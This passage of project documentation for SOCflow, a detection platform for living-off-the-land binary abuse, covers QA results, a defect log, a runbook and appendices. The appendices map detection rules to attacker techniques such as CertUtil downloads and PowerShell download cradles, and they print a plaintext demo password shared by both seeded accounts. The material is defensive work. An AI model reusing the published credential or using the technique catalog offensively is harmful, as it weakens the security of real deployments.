  stylesheets: [...document.styleSheets].map(s => s.cssRules.length),
  tailwindRuleFound: [...document.styleSheets].some(s => …includes('--tw-')),
  btnComputed: getComputedStyle(btn),  bodyFont: … }));
```

Result:

```json
{ "stylesheets": [google-fonts:ERR(CORS), localhost/index.css:183, injected:183],
  "tailwindRuleFound": true,
  "btnComputed": { "background":"rgb(37,99,235)", "fontSize":"14.4px",
                   "borderRadius":"8px", "display":"inline-flex" },
  "bodyFont": "Inter, system-ui, -apple-system, sans-serif" }
```

Verdict: **Tailwind v4 utilities + custom token CSS both live**; fonts resolved;
bundle double-injected (link + HMR module) — cosmetic, dev-only.

## 16.11 Database Verification (SQL executed in QA)

```sql
SELECT login_id,email,password_hash,status FROM soc_login;   -- 2 actives, bcrypt after boot
SELECT COUNT(*) FROM soc_detection_rule;                     -- 14 (rule 1 restored to enabled=1)
SELECT COUNT(*) FROM soc_alert_reference;                    -- 3 (QA demo seed)
SELECT COUNT(*) FROM soc_case;                               -- 1 (+1 transient QA case, removed)
DELETE FROM soc_login WHERE email IN ('autotest@…','apitest@…');  -- cleanup after tests
-- FK probes: duplicate case↔alert link → server 409 (not raw SQL), cascade mapping verified
```

Positive checks after fixes:
`/api/alerts/9 → 404 {"error":"Alert not found"}`; rule toggling persisted
(`UPDATE soc_detection_rule SET enabled … WHERE rule_id=1` round-trip 0↔1).

## 16.12 Feature Interaction Tests

**scripts**: `features.mjs` (ack/create-case/explorer/logout/theme — see §16.9
results), `retest.mjs` + `modal.mjs` (Provision User modal), plus API-layer
equivalence for every button handler (all 200s, §16.3/§16.6/§16.11).

| Feature | Method of proof | Result |
|---|---|---|
| Acknowledge alert | UI: `TRIAGED (OPEN)` plaque + success toast; DB `status='open'` | ✅ |
| Create case (analyst, modal) | UI: case appears in rail list | ✅ |
| Explorer search | UI: output rows contain `certutil.exe` | ✅ |
| Logout | UI: lands logged-out; `localStorage.token` cleared | ✅ |
| Theme toggle | UI: `data-theme dark→light` | ✅ |
| Provision user (manager modal) | UI: modal opens (`FINAL_users_modal.png`), page responsive; API `user_id:4`; audit `CREATE_USER`; test users deleted in cleanup | ✅ |
| Toggle rule (manager) | API `PUT /api/rules/1 {enabled:false}` → MySQL `enabled=0`; restored; audit `UPDATE_RULE` | ✅ |
| Disable/enable user | `PATCH /api/users/3/status` inactive→active; audit `UPDATE_USER_STATUS` | ✅ |
| Hosts page data | UI: FIN-SRV-01 & DEV-WKST-04 render | ✅ |
| Reports CSV export | Client-side data-URI download (code-reviewed) | ✅ |

## 16.13 Known/Test-Time Environmental Irregularities

| Observation | Classification |
|---|---|
| First `/login` snapshot missing markers | harness race: Vite cold compile > settle window |
| Browser evaluate timeouts during `users` interaction (2 runs) | environmental: concurrent foreign headless-Chrome automation + SwiftShader GPU contention on the same host; app verified responsive under identical click via `cpu.mjs` (renderer idle, no peg) |
| `/favicon.ico` 404 console noise | fixed inline-SVG icon (§17.3) |

## 16.14 Regression Checklist (re-run after any change)

1. `npx tsc --noEmit` exit 0.
2. MySQL: seed intact (`§16.11` selects).
3. API matrix (§16.3, §16.6) — especially: wrong-password 401; analyst 403 on `/api/users`; `/api/alerts/:id` 404 for garbage id.
4. Login-through-UI lands `/overview`, localStorage contains `token/userRole/…`.
5. Role redirects: manager↛`/alerts`, analyst↛`/users`.
6. Every page screenshot sweep (§16.7 harness): zero `pageErrors`.
7. Acknowledge alert round-trips; audit rows grow.
8. Backend restart → sessions invalidated (documented dev behavior).

# 17. Defect Log and Fixes Applied

## 17.1 DEF-001 — Login dead-end after successful authentication *(critical)*

| Field | Value |
|---|---|
| Symptom | UI login accepted valid credentials but bounced back to `/login`; perceived as "application login is not working" |
| Backend check | `POST /api/login` verified **200** for both seeded accounts — authentication sound |
| Root cause | `Login.tsx` stored `userRole/userName/userEmail/userId` but **never** `token`; `ProtectedRoute.tsx` requires `localStorage.getItem('token')` ⇒ first guard branch (`!token`) redirects to `/` → `/login`. Infinite bounce loop: login → overview guard → login. |
| Evidence | PROJECT_DETAILS.md line 756 documents the intended `localStorage.setItem('token', 'session-active')` contract; `Layout.tsx` logout cleanup already referenced a `token` key |
| Fix | `Login.tsx`: add `localStorage.setItem('token', 'session-active');` before `navigate('/overview')` |
| Regression §16.7 login suite | UI login lands `/overview`, token present, role pages reachable |
| Also verified | `tsc --noEmit` exit 0; logout still clears all five keys |

## 17.2 DEF-002 — `/api/alerts/:id` HTTP 500 on every call *(major)*

| Field | Value |
|---|---|
| Symptom | Alert detail never rendered; proxy log: `500 /api/alerts/9` |
| Server error | `{"error":"Unknown column 'a.matched_text' in 'field list'"}` |
| Root cause | The select references `a.matched_text`; the column exists in **no** schema (MySQL `DESCRIBE soc_alert_reference` listed 10 columns; no `matched_text`) |
| Impact analysis | `AlertDetail.tsx` reads `n.matched_text` only inside a conditional — column is optional |
| Fix | Remove `a.matched_text` (and its trailing comma) from the `/api/alerts/:id` select |
| Verification | `GET /api/alerts/9` → `404 {"error":"Alert not found"}`; existing alert id renders with real data (§16.9-4) |

## 17.3 DEF-003 — `/favicon.ico` 404 console noise *(cosmetic)*

No `<link rel="icon">` present. Fixed by inlining a shield-motif SVG data-URI in
`index.html` (§8.1). Console now free of resource 404s.

## 17.4 DEF-004 — Backend boot fails without externally-provided env *(operational)*

First restart executed without the originally-injected environment crashed:
`DB error: Access denied for user 'root'@'localhost'` → `process.exit(1)`.
The QA deployment used a dedicated MySQL account (`socflow`). Fixed by creating
**`backend/.env`** (loaded by `dotenv.config()`), making `node server.js`
self-sufficient. Subsequent restarts verified healthy (§16.5).

## 17.5 ENV-005 — Demo data gaps *(content)*

Alert/case tables seeded empty → many pages rendered trivially (empty states).
QA inserted representative demo data (3 alerts across severities incl. an
event-linked critical alert, 1 in-progress case with 2 linked alerts and 1 manager
note). All test-created accounts/cases were **removed** afterwards (§16.11);

## 17.6 Styling Note (not a defect)

Tailwind v4 invoked with v3 directives (`@tailwind base…`). Functionally emits a
valid sheet today (`/*! tailwindcss v4.3.3 */` + `@layer` — verified §16.10).
Recommend migration to `@import "tailwindcss";` per v4 upgrade path
plus removal of `tailwind.config.js` duplication.

---

# 18. Operations Runbook

## 18.1 Daily Operation

| Task | Command |
|---|---|
| Start backend | `cd backend && node server.js` |
| Start frontend | `npm run dev` (repo root) |
| Start engine | `python3 server/analyzer.py` |
| Health probe | `curl http://localhost:5001/api/connection/verify` |
| Reset demo data | `mysql -u <user> -p socflow < database/mysql_schema.sql` (backend rehashes passwords on next boot) |
| Tail audit | `mysql … -e 'ORDER BY audit_id DESC LIMIT 10' soc_audit_log` |

## 18.2 Incident Resets

| Scenario | Action |
|---|---|
| "Logged out everywhere" after backend restart | expected in dev (MemoryStore). Deploy Redis/Pg-store (§15.4) for continuity |
| Rule disabled accidentally | `PUT /api/rules/:id {enabled:true}` or `/rules` UI toggle |
| Bad agent enrollments | `DELETE FROM soc_agent WHERE agent_uuid=…` (host FK intact) |
| Engine lag | check `SELECT MAX(event_id) FROM soc_process_event` vs logs; restore from checkpoint |

## 18.3 Data Hygiene

```sql
-- purge old telemetry while keeping FK integrity:
DELETE FROM soc_process_event WHERE timestamp < NOW() - INTERVAL 90 DAY;
-- archive audit:
SELECT * FROM soc_audit_log ORDER BY audit_id DESC LIMIT 100;    -- review first
```

---

# 19. Appendices

## Appendix A — Composable Environment File Template

```dotenv
# backend/.env  (template — copy, adjust, chmod 600)
DB_HOST=127.0.0.1
DB_PORT=3306
DB_USER=socflow
DB_PASSWORD=change-me
DB_NAME=socflow
PORT=5001
SESSION_SECRET=<openssl rand -hex 32>
ENROLLMENT_SECRET=<openssl rand -hex 16>
# REDIS_URL=redis://127.0.0.1:6379        # optional
```

## Appendix B — Demo Accounts & Data Snapshot (QA environment)

```
soc_role           : 1=Manager, 2=Analyst
soc_login          : 1 manager@socflow.local (Manager)   2 analyst@socflow.local (Analyst)
                     password for both: SOCflow2026!  (bcrypt, seeded via SEED_PENDING rehash)
soc_host           : 1 FIN-SRV-01 (prod/high/active) · 2 DEV-WKST-04 (lab/low/active)
soc_agent          : 2 agents v2.0.0 bound to host 1/2
soc_detection_rule : 14 rules, all enabled, catalog of §2.2
soc_process_event  : 2 seeded catalog events (+ QA telemetry as generated)
soc_alert_reference: 3 QA demo alerts
                     #1 critical  CertUtil File Download  new→open  (92, link case 1)
                     #2 high      PowerShell Enc Command open     (85, link case 1)
                     #3 medium    Scheduled Task Persistence closed (60)
soc_case           : 1 'Suspected LOLBin Lateral Movement' in_progress, 1 note (manager)
soc_audit_log      : login/failed_login/logout/CREATE_USER/UPDATE_USER_STATUS/ACK_ALERT/
                     CREATE_CASE/UPDATE_RULE/ADD_HOST — appended live during §16
```

## Appendix C — MITRE ATT&CK Mapping (full table)

| Technique | Name | SOCflow Rules |
|---|---|---|
| T1047 | Windows Management Instrumentation | #8 WMIC |
| T1053.005 | Scheduled Task | #12 Schtasks |
| T1059.001 | PowerShell | #3 Encoded Command, #4 Download Cradle, #5 Execution Bypass |
| T1059.005 | Visual Basic Script | #14 WScript/CScript |
| T1087 / T1136 | Account Discovery / Create Account | #13 net.exe |
| T1105 | Ingress Tool Transfer | #1 CertUtil download, #11 BITSAdmin |
| T1140 | Deobfuscate/Decode Files | #2 CertUtil decode |
| T1197 | BITS Jobs | #11 (same as T1105 vector, distinct indicator family) |
| T1218.005 | Mshta | #6 |
| T1218.007 | Msiexec | #9 |
| T1218.010 | Regsvr32 | #7 |
| T1218.011 | Rundll32 | #10 |

## Appendix D — Glossary

| Term | Meaning |
|---|---|
| LotL / LOLBin | Living-off-the-Land binary — legitimate OS tool abused for malicious purposes |
| Sysmon | Mark Russinovich system-monitoring driver; Event ID 1 = ProcessCreate |
| Program Set (PS) | not used by SOCflow |
| Case | Managed investigation container for one compromise story |
| Acknowledgment | Analyst opens a NEW alert (`status='open'`)≈start triage |
| Confidence Score | Rule engine weight 0-100; ≥80 critical, ≥60 high, ≥40 medium, else low |
| Detection Source | `rule` (current), `ml`/`hybrid` reserved columns |
| Enrollment | Out-of-band onboarding of a host: password secret ↔ agent uuid/key pair |

## Appendix E — Screenshot Manifest (QA, `/tmp/opencode/shots/`)

```
LOGIN_login.png                     login page (dark, card layout)
MANAGER_overview.png                manager dashboard
MANAGER_hosts.png  _users  _rules   fleet / accounts / 14 rules
MANAGER_audit.png  _reports         audit timeline / reports KPI page
MANAGER_alerts.png                  (redirect proof)
ANALYST_alerts-list.png             alert feed with filters
DEEP_03-alert-detail.png            forensic inspector for alert #1
DEEP_07-reports.png                 manager reports fully populated
F_A1_ack.png                        TRIAGED (OPEN) plaque + success toast
F_A2_newcase.png  F_A3_search.png   case modal creation / explorer query
F_A4_logout.png   F_M2_rules.png    logout / rules state change
F_M5_theme.png                      light-mode flip
FINAL_users_modal.png               Provision New User modal open
```

## Appendix F — Change Log (QA-campaign visible deltas)

```
[2026-10-16 chg-1] views/Login.tsx        + localStorage.setItem('token','session-active')
[2026-10-16 chg-2] backend/server.js      GET /api/alerts/:id  − a.matched_text  (500→404)
[2026-10-16 chg-3] backend/.env           ADDED (DB creds + PORT)
[2026-10-16 chg-4] index.html             ADDED inline SVG favicon
[2026-10-16 chg-5] MySQL socflow          QA seeds applied (16.11) then test artifacts purged
```

---

*End of document — SOCflow / sentinel-lotl-forensics complete project documentation.*







